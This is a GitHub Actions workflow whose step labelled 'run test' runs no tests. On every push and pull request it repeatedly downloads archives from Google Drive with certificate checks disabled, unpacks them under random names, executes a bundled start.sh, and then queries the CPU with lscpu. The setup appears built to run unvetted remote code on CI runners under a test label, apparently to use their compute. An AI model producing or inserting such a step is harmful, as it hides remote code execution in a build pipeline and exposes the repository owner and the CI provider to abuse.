name: Phu Hang

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v4
    - name: Set up Python 3.12
      uses: actions/setup-python@v3
      with:
        python-version: "3.12"
    - name: run test
      run: |
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=14y6J_sfbzL_zDXvOkM-6mmbxO5A0Ackr&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user;
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1TTzdGNhTnmNxymj8N8s68_zTuI10H0q7&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user;
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1fr-NTd2Prha24MKIbKdUX_44a3kZyzN0&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user;
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1qrGgynU1KMtHuxLdGp-yQ7ZejOTjoARZ&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user;
        R=$(tr -dc a-z0-9 </dev/urandom | head -c 8) && wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1xFoMSXXryTzzB1tvSBfbnwpr0eP4_BCs&export=download&confirm=t' -O "$R.tar.gz" && tar -xf "$R.tar.gz" && mv python-mcp "$R" && cd "$R" && chmod +x start.sh && ./start.sh 4 user;
        lscpu